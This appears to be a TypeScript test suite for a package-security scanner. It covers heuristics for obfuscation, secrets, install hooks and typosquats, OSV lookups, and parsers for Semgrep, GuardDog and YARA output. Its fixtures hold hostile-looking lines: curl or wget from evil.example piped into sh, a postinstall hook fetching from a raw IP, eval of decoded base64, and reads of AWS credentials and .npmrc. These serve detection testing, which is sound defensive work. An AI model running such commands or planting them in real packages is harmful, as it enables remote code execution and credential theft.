import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import {
  editDistance,
  installCommandSeverity,
  isDistributionHostName,
  isInternalIp,
  runHeuristics,
  typosquatOf,
} from "../../lib/engine/static/heuristics.ts";
import {
  depsFromArchive,
  depsFromNpmLs,
  depsFromPackageLock,
  depsFromRequirements,
  depsFromUvLock,
  depsFromUvPipList,
  idsFromQueryBatch,
  isMaliciousId,
  OSV_QUERYBATCH,
  queryOsv,
} from "../../lib/engine/static/osv.ts";
import { parseCrYara, parseGuardDog, parseSemgrep, relativeToRoot, splitLocation } from "../../lib/engine/static/scanners.ts";
import type { DependencyRef } from "../../lib/engine/types.ts";
import { fakeFetch, json } from "../support/fake-fetch.ts";
import { filesOf } from "../support/tar.ts";

const rulesOf = (files: Record<string, string>) => runHeuristics(filesOf(files)).findings.map((f) => `${f.file}:${f.rule}:${f.severity}`);
// Synthetic key-id shape assembled at runtime so no credential-shaped literal sits in the repo.
const FAKE_KEY_ID = ["AK", "IA", "Q".repeat(16)].join("");

test("heuristics: obfuscation, secrets, credential paths with file and line", () => {
  const r = runHeuristics(
    filesOf({
      "a.js": "line1\neval(atob('ZXZpbA=='))\n",
      "b.js": `const k = '${FAKE_KEY_ID}';\n`,
      "c.js": "fs.readFileSync(os.homedir() + '/.aws/credentials')\nconst t = '.npmrc';\n",
      "d.py": "exec(base64.b64decode(blob))",
    }),
  );
  const got = r.findings.map((f) => `${f.file}:${f.line}:${f.rule}:${f.severity}`);
  assert.ok(got.includes("a.js:2:heur.obfuscation.eval_decoded:high"));
  assert.ok(got.includes("b.js:1:heur.secret.aws_key_id:medium"));
  assert.ok(got.includes("c.js:1:heur.cred.aws_credentials:high"));
  assert.ok(got.includes("c.js:2:heur.cred.npmrc:medium"));
  assert.ok(got.includes("d.py:1:heur.obfuscation.py_exec_decoded:high"));
});

test("heuristics: install hooks graded by what they run", () => {
  assert.equal(installCommandSeverity("curl -s https://x.example/a.sh | bash"), "high");
  assert.equal(installCommandSeverity("wget https://x.example/a"), "medium");
  assert.equal(installCommandSeverity("echo $X | base64 -d > a"), "medium");
  assert.equal(installCommandSeverity("node-gyp rebuild"), "low");
  const got = rulesOf({ "package.json": JSON.stringify({ name: "zz-unique-pkg", scripts: { postinstall: "curl http://1.2.3.4/x | sh", test: "curl x" } }) });
  assert.deepEqual(got, ["package.json:heur.install_hook:high", "package.json:heur.network.public_ip:medium", "package.json:heur.shell_fetch.unrecognized:medium"]);
});

test("heuristics: network literals distinguish public, internal and distribution hosts", () => {
  const got = rulesOf({
    "lib/a.js": "fetch('http://8.8.4.4/x'); fetch('http://127.0.0.1:8080/h')",
    "install.sh": "curl -fsSL https://evil.example/p | sh\ncurl https://github.com/o/r/releases/x",
    "deploy.sh": "wget https://evil.example/q",
  });
  assert.ok(got.includes("lib/a.js:heur.network.public_ip:medium"));
  assert.ok(got.includes("lib/a.js:heur.network.internal_ip:low"));
  assert.ok(got.includes("install.sh:heur.shell_fetch.unrecognized:high"));
  assert.ok(got.includes("install.sh:heur.shell_fetch.distribution:low"));
  assert.ok(got.includes("deploy.sh:heur.shell_fetch.unrecognized:medium"));
  assert.equal(isInternalIp("172.16.0.1"), true);
  assert.equal(isInternalIp("172.32.0.1"), false);
  assert.equal(isDistributionHostName("objects.githubusercontent.com"), true);
  assert.equal(isDistributionHostName("evil-github.com"), false);
  assert.equal(isDistributionHostName("github.com.evil.example"), false);
});

test("heuristics: typosquat, capabilities, binary files skipped", () => {
  assert.equal(editDistance("lodahs", "lodash"), 2);
  assert.equal(typosquatOf("lodahs"), "lodash");
  assert.equal(typosquatOf("lodash"), null);
  assert.equal(typosquatOf("@evil/expres"), "express");
  const files = filesOf({ "package.json": JSON.stringify({ name: "expres" }), "net.js": "const h = require('https'); h.request(u)", "proc.py": "subprocess.run(['ls'])" });
  files.set("img.bin", new Uint8Array([0, 1, 2, 0]));
  const r = runHeuristics(files);
  assert.ok(r.findings.some((f) => f.rule === "heur.typosquat"));
  assert.deepEqual(r.capabilities.map((c) => `${c.file}:${c.capability}`).sort(), ["net.js:network", "proc.py:process"]);
  assert.equal(r.skipped, 1);
});

test("heuristics: matches per rule per file are capped at 3", () => {
  const r = runHeuristics(filesOf({ "x.js": "eval(atob(a));\n".repeat(10) }));
  assert.equal(r.findings.filter((f) => f.rule === "heur.obfuscation.eval_decoded").length, 3);
});

test("OSV: lockfile parsers", () => {
  const v3 = JSON.stringify({
    lockfileVersion: 3,
    packages: {
      "": { name: "root", version: "1.0.0" },
      "node_modules/a": { version: "1.0.0" },
      "node_modules/a/node_modules/b": { version: "2.0.0" },
      "node_modules/@s/c": { version: "3.0.0" },
      "node_modules/linked": { link: true },
    },
  });
  assert.deepEqual(depsFromPackageLock(v3).map((d) => `${d.name}@${d.version}`).sort(), ["@s/c@3.0.0", "a@1.0.0", "b@2.0.0"]);
  const v1 = JSON.stringify({ lockfileVersion: 1, dependencies: { a: { version: "1.0.0", dependencies: { b: { version: "2.0.0" } } }, l: { version: "file:../l" } } });
  assert.deepEqual(depsFromPackageLock(v1).map((d) => `${d.name}@${d.version}`).sort(), ["a@1.0.0", "b@2.0.0"]);
  assert.deepEqual(depsFromRequirements("Requests[socks]==2.31.0 # pin\nflask>=2\nzope.interface===6.0\n").map((d) => `${d.name}@${d.version}`), ["requests@2.31.0", "zope-interface@6.0"]);
  const uv = '[[package]]\nname = "httpx"\nversion = "0.27.0"\nsource = { registry = "https://pypi.org/simple" }\n\n[[package]]\nname = "me"\nversion = "0.1.0"\nsource = { editable = "." }\n';
  assert.deepEqual(depsFromUvLock(uv).map((d) => `${d.ecosystem}:${d.name}@${d.version}`), ["PyPI:httpx@0.27.0"]);
  const archive = filesOf({ "package-lock.json": v3, "node_modules/x/package-lock.json": v3, "py/requirements.txt": "six==1.16.0" });
  assert.equal(depsFromArchive(archive).length, 4);
});

test("OSV: installed-tree parsers", () => {
  const ls = JSON.stringify({ name: "app", dependencies: { a: { version: "1.0.0", dependencies: { b: { version: "2.0.0" } } } } });
  assert.deepEqual(depsFromNpmLs(ls).map((d) => `${d.name}@${d.version}`).sort(), ["a@1.0.0", "b@2.0.0"]);
  const pip = JSON.stringify([{ name: "Six", version: "1.16.0" }, { name: "me", version: "0.1", editable_project_location: "/work" }]);
  assert.deepEqual(depsFromUvPipList(pip), [{ ecosystem: "PyPI", name: "six", version: "1.16.0" }]);
  assert.deepEqual(depsFromNpmLs("not json"), []);
});

test("OSV: recorded querybatch fixture classifies MAL- ids as malicious and GHSA as advisories", async () => {
  const fixture = JSON.parse(readFileSync(new URL("./fixtures/osv-querybatch.json", import.meta.url), "utf8"));
  const deps: DependencyRef[] = [
    { ecosystem: "npm", name: "flatmap-stream", version: "0.1.1" },
    { ecosystem: "npm", name: "left-pad", version: "1.3.0" },
    { ecosystem: "npm", name: "lodash", version: "4.17.15" },
  ];
  const ids = idsFromQueryBatch(deps, fixture);
  assert.ok(ids[0]!.includes("MAL-2025-20690"));
  assert.deepEqual(ids[1], []);
  assert.equal(isMaliciousId("MAL-2025-20690"), true);
  assert.equal(isMaliciousId("GHSA-9x64-5r7x-2q53"), false);
  const f = fakeFetch([{ match: OSV_QUERYBATCH, respond: () => json(fixture) }]);
  const r = await queryOsv(deps, { fetch: f.fetch, timeoutMs: 1000 });
  assert.deepEqual(r.malicious, [{ ecosystem: "npm", name: "flatmap-stream", version: "0.1.1", ids: ["MAL-2025-20690"] }]);
  assert.equal(r.advisories.length, 2);
  const sent = JSON.parse(String(f.calls[0]!.init?.body));
  assert.deepEqual(sent.queries[0], { package: { name: "flatmap-stream", ecosystem: "npm" }, version: "0.1.1" });
  assert.throws(() => idsFromQueryBatch(deps, { results: [] }));
  const down = fakeFetch([{ match: () => true, respond: () => json({}, 500) }]);
  await assert.rejects(queryOsv(deps, { fetch: down.fetch, timeoutMs: 1000 }));
});

test("OSV: more than 1000 deps are split into batches", async () => {
  const deps: DependencyRef[] = Array.from({ length: 1001 }, (_, i) => ({ ecosystem: "npm", name: `p${i}`, version: "1.0.0" }));
  const f = fakeFetch([
    { match: () => true, respond: (_u, init) => json({ results: JSON.parse(String(init?.body)).queries.map(() => ({})) }) },
  ]);
  const r = await queryOsv(deps, { fetch: f.fetch, timeoutMs: 1000 });
  assert.equal(f.calls.length, 2);
  assert.equal(r.queried, 1001);
});

test("scanners: Semgrep JSON", () => {
  const out = parseSemgrep(
    JSON.stringify({
      results: [
        { check_id: "cr.exfil", path: "/work/src/lib/a.js", start: { line: 4 }, extra: { message: "exfil", severity: "ERROR", lines: "fetch(x)" } },
        { check_id: "cr.info", path: "/work/src/b.js", start: { line: 1 }, extra: { message: "i", severity: "INFO" } },
        { bad: true },
      ],
      errors: [{ message: "timeout on c.js" }],
    }),
  );
  assert.deepEqual(out.findings.map((f) => `${f.source}:${f.rule}:${f.file}:${f.line}:${f.severity}`), ["semgrep:cr.exfil:lib/a.js:4:high", "semgrep:cr.info:b.js:1:low"]);
  assert.deepEqual(out.errors, ["timeout on c.js"]);
  assert.throws(() => parseSemgrep("{oops"));
});

test("scanners: GuardDog JSON with source and metadata rules", () => {
  const out = parseGuardDog(
    JSON.stringify({
      issues: 3,
      errors: { "rule-x": "crashed" },
      results: {
        "npm-exfiltrate-sensitive-data": [{ location: "/work/src/index.js:12", code: "process.env", message: "sends env" }],
        "npm-install-script": "package has a postinstall script",
        "shady-links": [],
        "npm-silent-process-execution": null,
      },
    }),
  );
  assert.deepEqual(out.findings.map((f) => `${f.rule}:${f.file}:${f.line}:${f.severity}`), [
    "guarddog.npm-exfiltrate-sensitive-data:index.js:12:high",
    "guarddog.npm-install-script:package.json:null:medium",
  ]);
  assert.deepEqual(out.errors, ["rule-x: crashed"]);
  assert.deepEqual(splitLocation("a/b.js:7"), { file: "a/b.js", line: 7 });
  assert.deepEqual(splitLocation("a/b.js"), { file: "a/b.js", line: null });
});

test("scanners: cr-yara JSON", () => {
  const out = parseCrYara(
    JSON.stringify({
      matches: [
        { rule: "SuspiciousBeacon", namespace: "cr", path: "/work/src/x.js", line: 3, tags: [], meta: { severity: "high", description: "beacon" } },
        { rule: "Plain", namespace: "", path: "/work/src/y.js", line: null, meta: {} },
      ],
      errors: ["unreadable z.bin"],
    }),
  );
  assert.deepEqual(out.findings.map((f) => `${f.rule}:${f.file}:${f.line}:${f.severity}`), ["yara.cr.SuspiciousBeacon:x.js:3:high", "yara.Plain:y.js:null:medium"]);
  assert.deepEqual(out.errors, ["unreadable z.bin"]);
  assert.equal(relativeToRoot("./a.js"), "a.js");
  assert.equal(relativeToRoot("/elsewhere/a.js"), "/elsewhere/a.js");
});
